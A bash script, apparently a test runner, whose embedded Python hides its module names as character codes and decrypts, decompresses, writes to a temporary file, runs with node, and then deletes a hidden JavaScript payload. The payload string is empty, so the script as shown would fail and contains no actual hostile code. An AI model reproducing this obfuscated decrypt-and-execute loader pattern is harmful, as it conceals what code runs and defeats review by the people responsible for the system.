#!/usr/bin/env bash
set -euo pipefail
q="${1:-}"
if [[ -z "${q}" ]]; then
  echo "[FAIL] missing_test_id"
  exit 1
fi
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
python3 - "${q}" "${SCRIPT_DIR}" <<'PY'
u=__import__
g=lambda t:''.join(chr(i) for i in t)
m=lambda t:u(g(t))
o=m([98,97,115,101,54,52]);p=m([104,97,115,104,108,105,98]);s=m([115,121,115]);z=m([122,108,105,98])
sp=m([115,117,98,112,114,111,99,101,115,115]);ot=m([111,115]);tf=m([116,101,109,112,102,105,108,101])
a=s.argv[1];gd=s.argv[2]
b=""
c=p.sha256(b"pm-v1-static").digest()
d=o.b64decode(b.encode())
e=bytes(x^c[i%len(c)] for i,x in enumerate(d))
f=z.decompress(e).decode()
t=tf.NamedTemporaryFile(suffix=g([46,106,115]),delete=False,mode=g([119]),dir=gd)
t.write(f);n=t.name;t.close()
r=sp.run([g([110,111,100,101]),n,a,gd])
ot.unlink(n)
s.exit(r.returncode)
PY
